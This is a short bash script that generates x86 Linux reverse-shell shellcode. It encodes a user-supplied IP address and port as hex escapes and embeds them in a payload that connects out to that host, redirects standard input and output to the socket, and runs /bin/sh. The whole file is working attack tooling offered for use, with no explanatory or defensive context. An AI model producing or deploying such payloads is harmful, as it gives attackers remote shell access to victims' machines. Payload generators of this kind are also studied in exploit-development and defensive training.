#!/bin/bash

if [ -z "$2" ]
  then
    echo "Usage $0 <IP> <port number>"
    exit 1
fi

if [[ $1 =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]
   then
     IP=`for i in $(echo $1 | sed 's/\./\n/g'); do printf '\\\\x''%02x' $i ; done`
     port=`printf '%04x\n' $2 | awk '{print "\x"$0}' | sed 's/.\{4\}/&\\\\x/g'`
     echo "IP:"$IP
     echo "Port:"$port
   else
     echo "Please enter a valid IP address"
     exit 1
fi

shellcode="\x31\xc0\x31\xdb\x31\xc9\xb3\x01\x50\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x89\xc6\x5b\x31\xd2\x68$IP\x66\x68$port\x66\x53\x89\xe1\x6a\x10\x51\x56\x43\x89\xe1\xb0\x66\xcd\x80\x31\xc9\xb1\x02\x89\xf3\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xca\xb0\x0b\xcd\x80"
echo "Shellcode:"
echo $shellcode
